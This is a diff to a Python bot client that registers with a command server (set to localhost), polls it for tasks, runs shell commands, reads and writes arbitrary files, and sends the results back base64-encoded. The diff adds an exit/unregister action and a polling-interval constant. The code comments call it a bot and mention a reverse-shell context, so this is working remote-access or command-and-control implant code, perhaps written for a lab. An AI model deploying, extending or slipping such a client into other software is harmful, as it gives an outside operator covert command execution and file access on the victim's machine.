@@ -13,9 +13,8 @@ import asyncio
 import base64
 
 ID = None
-COUNT = 0
 SERVER_URL = "http://localhost:8080"
-
+POLL_SEC = 5
 
 async def run_and_return_output(command: dict[str, Any]) -> bytes:
     # run the subprocess without blocking the executor, we may be in either a reverse shell context
@@ -26,12 +25,10 @@ async def run_and_return_output(command: dict[str, Any]) -> bytes:
 
     return stdout
 
-
 def read_file_sync(path: str) -> bytes:
     # note: reading in binary mode to get `bytes` object from f.read()
     with open(path,  "rb") as f:
         return f.read()
-
 
 async def read_file(command: dict[str, Any]) -> bytes:
     loop = asyncio.get_event_loop()
@@ -39,13 +36,11 @@ async def read_file(command: dict[str, Any]) -> bytes:
     # same reason as above, we avoid blocking the executor while reading the file
     return await loop.run_in_executor(None, lambda: read_file_sync(command["path"]))
 
-
 def write_file_sync(path: str, data: bytes) -> bytes:
     # note: writing in binary mode to avoid schenanigans with newlines
     with open(path,  "wb") as f:
         # turn the integer into a string, and encode it as bytes
         return str(f.write(data)).encode()
-
 
 async def write_file(command: dict[str, Any]) -> bytes:
     loop = asyncio.get_event_loop()
@@ -53,7 +48,6 @@ async def write_file(command: dict[str, Any]) -> bytes:
 
     # same reason as above, we avoid blocking the executor while reading the file
     return await loop.run_in_executor(None, lambda: write_file_sync(command["path"], data))
-
 
 async def return_result(session: ClientSession, result: bytes):
     # to avoid weird behavior with files containing escape characters/arbitrary bytes,
@@ -63,7 +57,6 @@ async def return_result(session: ClientSession, result: bytes):
 
     await session.post(f"{SERVER_URL}/result", json={"id": ID, "result": b64})
 
-
 async def execute_command(session: ClientSession, command: dict[str, Any]) -> None:
     try:
         if command["action"] == "execute":
@@ -72,6 +65,11 @@ async def execute_command(session: ClientSession, command: dict[str, Any]) -> No
             result = await read_file(command)
         elif command["action"] == "write":
             result = await write_file(command)
+        # exiting requires special handling
+        elif command["action"] == "exit":
+            await exit_bot()
+            await return_result(session, f"{ID} Exited".encode())
+            exit(0)
         else:
             result = f"unknown action: {command['action']}".encode()
 
@@ -80,12 +78,17 @@ async def execute_command(session: ClientSession, command: dict[str, Any]) -> No
 
     await return_result(session, result)
 
+async def exit_bot():
+    # call the unregister endpoint to remove from the server queue
+    # the endpoint returns any remaining queued commands (can store on disk for next run)
+    async with ClientSession() as session:
+        async with session.get(f"{SERVER_URL}/unregister/{ID}") as response:
+            remaining = await response.json()
 
 async def obtain_id() -> str:
     async with ClientSession() as session:
         async with session.get(f"{SERVER_URL}/init") as response:
             return (await response.json())["id"]
-
 
 async def main():
     global ID
@@ -107,7 +110,7 @@ async def main():
 
                 await execute_command(session, next)
 
-        await asyncio.sleep(5)
+        await asyncio.sleep(POLL_SEC)
 
 if __name__ == "__main__":
     asyncio.run(main())
